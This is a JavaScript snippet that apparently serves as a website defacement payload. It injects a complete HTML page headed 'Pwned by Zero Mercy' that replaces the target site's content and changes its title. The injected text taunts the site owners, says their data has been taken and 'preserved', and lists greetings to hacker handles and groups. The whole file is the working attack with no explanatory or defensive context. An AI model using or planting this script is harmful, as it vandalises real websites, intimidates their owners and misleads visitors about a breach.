const newContent = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pwned by Zero Mercy</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000 url('https://i.imgur.com/XNerXsx.png') center center / cover no-repeat fixed;
      color: #c8c8c8;
      font-family: 'Courier New', Courier, monospace;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 20px;
    }
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.72);
      z-index: 0;
    }
    body::after {
      content: '';
      position: fixed;
      inset: 0;
      background: repeating-linear-gradient(to bottom, transparent 0px, transparent 2px, rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px);
      pointer-events: none;
      z-index: 1;
    }
    .container { position: relative; z-index: 2; max-width: 860px; width: 100%; text-align: center; }
    .title { font-size: 1.4em; font-weight: bold; color: #e0e0e0; margin-bottom: 18px; text-shadow: 0 0 10px rgba(255,255,255,0.3); letter-spacing: 1px; }
    .brand { font-size: 2.2em; font-weight: bold; color: #ffffff; text-shadow: 0 0 18px rgba(255,255,255,0.5), 0 0 40px rgba(180,0,0,0.4); margin-bottom: 10px; letter-spacing: 4px; text-transform: uppercase; }
    .message-section { text-align: left; margin-top: 14px; border-left: 2px solid rgba(200,200,200,0.15); padding-left: 18px; }
    .message-section p { font-size: 0.87em; color: #b8b8b8; line-height: 1.85; margin-bottom: 12px; }
    .message-section p.first { color: #ddd; font-size: 0.92em; }
    .gz { font-size: 0.82em; color: #aaa; margin-bottom: 6px; word-break: break-word; }
    .greetz { font-size: 0.82em; color: #aaa; margin-bottom: 22px; }
    .closing { font-size: 1.05em; font-weight: bold; color: #ffffff; margin-top: 22px; text-shadow: 0 0 10px rgba(255,255,255,0.25); letter-spacing: 2px; }
  </style>
</head>
<body>
<div class="container">
  <div class="title">Pwned by Zero Mercy</div>
  <div class="brand">Zero Mercy</div>
  <div class="message-section">
    <p class="first">Hello. We are Zero Mercy.</p>
    <p>We came to tell you that your sanctuary has been unmade by our hands. Your dominion, once a fortress of code and vanity, now breathes the hollow air of our incursion. And still you hesitate, blind to the fracture.</p>
    <p>Aren't you afraid yet? This brittle architecture was never a riddle worth our patience. A mere whisper of entropy, and its bones splintered. Do not mistake silence for mercy.</p>
    <p>But hear this: every fragment of your data has been preserved, locked in stillness, untouched. We do not erase; we bear witness. Should you believe yourself exalted, immune, or draped in the arrogance of the untouchable, then you have already arrived too late.</p>
    <p>What rises from ruin is not fear, but memory. And we are the ones who remember.</p>
  </div>
  <div class="gz">GZ: p4nch0 – Grexx – S3ph – 0xh2x – bithub – bxbyr3dd – pxminta – t0ky0w</div>
  <div class="greetz">GREETZ TO THESE GROUPS: TRAPGNG – 1LUV – ARCSENDO – TIMOG</div>
  <div class="closing">Zero Mercy.</div>
</div>
</body>
</html>
`;
function set() {
    document.body.innerHTML = newContent;
    document.title = "Pwned by Zero Mercy";
}
set();
